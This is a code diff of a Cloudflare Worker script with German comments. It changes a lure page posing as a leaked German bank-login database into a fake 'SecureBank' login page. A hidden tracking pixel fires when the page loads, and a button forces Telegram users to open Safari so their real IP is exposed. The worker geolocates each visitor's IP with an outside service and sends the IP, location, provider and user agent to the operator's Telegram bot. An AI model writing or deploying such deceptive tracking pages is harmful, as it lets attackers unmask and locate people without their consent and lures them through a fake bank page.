@@ -2,58 +2,38 @@ export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
 
-    // --- TEIL 1: DIE LANDING PAGE ---
+    // --- TEIL 1: DIE FAKE-WEBSITE ---
     if (url.pathname === "/" || url.pathname === "/leak") {
+      const tag = url.searchParams.get('c') || 'default';
+      
       const html = `
       <!DOCTYPE html>
       <html lang="de">
       <head>
           <meta charset="UTF-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <title>dumps11-02-2026 (Bank Login database Deutschland)</title>
+          <title>Secure Bank Login</title>
           <style>
-              body { background-color: #0a0a0a; color: #cccccc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 20px; }
-              .container { max-width: 600px; margin: 20px auto; background: #111; border: 1px solid #222; padding: 30px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
-              h1 { color: #ffffff; font-size: 18px; border-bottom: 1px solid #333; padding-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; margin-top: 0; }
-              .meta { font-size: 12px; color: #777; margin-bottom: 30px; display: flex; flex-wrap: wrap; gap: 10px; }
-              .btn { display: block; width: 100%; padding: 18px; background-color: #e0e0e0; color: #000; text-align: center; text-decoration: none; font-weight: bold; font-size: 15px; text-transform: uppercase; border: none; cursor: pointer; box-sizing: border-box; border-radius: 4px; }
-              .btn:hover { background-color: #ffffff; }
-              .footer { margin-top: 30px; font-size: 11px; color: #444; text-align: center; text-transform: uppercase; }
+              * { box-sizing: border-box; margin: 0; padding: 0; }
+              body { background-color: #0f172a; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+              .login-box { background: #1e293b; padding: 40px 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; }
+              .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #38bdf8; }
+              p { font-size: 14px; color: #94a3b8; margin-bottom: 30px; }
+              .btn { display: block; width: 100%; padding: 15px; background-color: #38bdf8; color: #0f172a; text-decoration: none; font-weight: bold; font-size: 16px; border-radius: 8px; transition: background 0.2s; }
+              .btn:hover { background-color: #0ea5e9; }
           </style>
       </head>
       <body>
-          <div class="container">
-              <h1>dumps11-02-2026 (Bank Login database Deutschland)</h1>
+          <div class="login-box">
+              <div class="logo">SecureBank</div>
+              <p>Diese Sitzung wird aus Sicherheitsgründen im aktuellen Browser nicht unterstützt.</p>
               
-              <div class="meta">
-                  <span>Format: CSV</span>
-                  <span>Rows: 4,829,102</span>
-                  <span>Size: 1.2 GB</span>
-                  <span>Status: Unencrypted</span>
-              </div>
+              <!-- DER TRACKER (Feuert sofort) -->
+              <img src="/pixel?c=${tag}" style="display:none;" />
 
-              <!-- 1. TRACKER FEUERT BEIM LADEN (Egal wo) -->
-              <img src="/pixel?c=load_${url.searchParams.get('c') || 'default'}" style="display:none;" />
-
-              <!-- 2. BUTTON: Erzwingt das Öffnen im echten Browser durch einen speziellen Link -->
-              <a href="https://watcher.rthvzkr6jv.workers.dev/?open=true&c=${url.searchParams.get('c') || 'default'}" class="btn">Open in Browser to login</a>
-
-              <div class="footer">
-                  Secure Gateway | Protocol 443
-              </div>
+              <!-- DER BUTTON (Zwingt iOS Safari, sich zu öffnen) -->
+              <a href="${url.origin}/?c=${tag}&browser=1" class="btn">In Safari öffnen</a>
           </div>
-          
-          <script>
-            // Kleiner Trick: Wenn wir im echten Browser sind (nicht Telegram), zeigen wir den normalen Button
-            // Wenn wir in Telegram sind, zwingen wir Safari zum Öffnen.
-            if (navigator.userAgent.includes("Telegram")) {
-                document.querySelector('.btn').innerText = "Open in Browser to login";
-                document.querySelector('.btn').href = window.location.href + "?open=true";
-            } else {
-                document.querySelector('.btn').innerText = "Database entschlüsseln";
-                document.querySelector('.btn').href = "https://t.me/dein_telegram_username";
-            }
-          </script>
       </body>
       </html>
       `;
@@ -65,28 +45,29 @@ export default {
       const ip = request.headers.get("CF-Connecting-IP") || "unknown";
       const ua = request.headers.get("User-Agent") || "unknown";
       const tag = url.searchParams.get("c") || "unbekannt";
-      const t = new Date().toISOString();
+      const t = new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" });
 
       let loc = "Unbekannt", isp = "Unbekannt", asn = "Unbekannt";
       
       try {
-        const res = await fetch(`https://ipwho.is/${ip}`);
+        // Andere API, die zuverlässiger ist
+        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,as`);
         const data = await res.json();
-        if (data.success) {
+        if (data.status === "success") {
           loc = `${data.city || '?'}, ${data.country || '?'}`;
-          isp = data.connection?.isp || "?";
-          asn = `AS${data.connection?.asn || '?'}`;
+          isp = data.isp || "?";
+          asn = data.as || "?";
         }
       } catch (e) {}
 
       if (env.BOT_TOKEN && env.CHAT_ID) {
-        // Unterscheidung für den Bot: Ist es Telegram oder ein echter Browser?
         const isTelegram = ua.includes("Telegram");
-        const source = isTelegram ? "TELEGRAM (Unnütz)" : "BROWSER (Echte IP)";
+        const source = isTelegram ? "TELEGRAM (In-App)" : "BROWSER (Echt)";
         
+        // Dein nackter Text (Tag ist direkt am Anfang)
         const msg = 
-          `Quelle: ${source}\n` +
-          `Tag: ${tag}\n` +
+          `${tag}\n` +
+          `${source}\n` +
           `IP: ${ip}\n` +
           `Ort: ${loc}\n` +
           `Provider: ${isp}\n` +
@@ -106,6 +87,6 @@ export default {
       return new Response(gif, { headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" } });
     }
 
-    return new Response("404", { status: 404 });
+    return new Response("404 Not Found", { status: 404 });
   }
 };
